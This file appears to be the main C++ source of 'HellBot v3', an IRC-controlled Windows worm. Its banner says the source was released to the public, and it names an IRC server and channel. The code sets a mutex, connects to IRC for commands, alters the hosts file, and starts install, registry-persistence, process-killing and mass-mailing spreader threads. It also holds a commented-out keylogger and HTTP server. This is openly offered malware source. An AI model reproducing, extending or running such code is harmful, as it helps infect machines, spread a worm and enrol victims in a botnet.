/*---------------------------------------------*
-> Hellbot::WIN32  

	Wip
  -----
  - here started project.

-> Rules: never leak this.

/*---------------------------------------------*/

#include "Include.h"
#include "Hell.h"

#pragma warning(disable:4786)
#ifdef DEBUG_MODE
	#pragma comment(linker, "/subsystem:console")
#else
	#pragma comment(linker,"/subsystem:windows")
#endif

#pragma data_seg(SECTION_NAME)

__declspec(allocate(SECTION_NAME)) char szBuf[16384];


using namespace std;

CHELL *Hell=NULL;

bool CHELL::Check(void)
{
	while (botRunning)
		Sleep(250); 

	if (!botRunning) 
		return false; 
	else 
		return true;
}

int CHELL::HELLMAIN(void)
{
	WSADATA initSock;
	if (WSAStartup(MAKEWORD(2,2), &initSock)) {   
		cout << "Winsock startup error." << endl;
		exit(0);
	}
	CreateMutex(NULL, FALSE, "H-E-L-L-B-O-T-P-O-L-Y-M-O-R-P-H");
	while (GetLastError() == ERROR_ALREADY_EXISTS) {
		exit(0);
	}
	botRunning = true;
	cIRC.Init();
	AddHosts();
	Hell->hInstall.Start(true);	
	Hell->hRegcheck.Start(true);
	Hell->killthread.Start(true);
	Sleep(2000); //litle fix for httpd,mailz ;)
	Hell->Hellmail.Start(true);
	//Hell->Hellhttpd.Start(true);
	//Hell->keylog.Start(true);
	Sleep(3000);	
	
	cIRC.Start(false,true,false);
	if (!Check())
		return 0;
}

#ifdef DEBUG_MODE
int main()
#else
int _stdcall WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine, int nShowCmd)
#endif
{		
	cout << endl << " The source of this worm has been released to public. irc server: irc.powerirc.net #ccpower . thx to everyone." << endl;
	cout << endl << "[x] starting HellBot::v3 beta2" << endl;

	Hell = new CHELL;
	Hell->HELLMAIN();

	return 0;
}

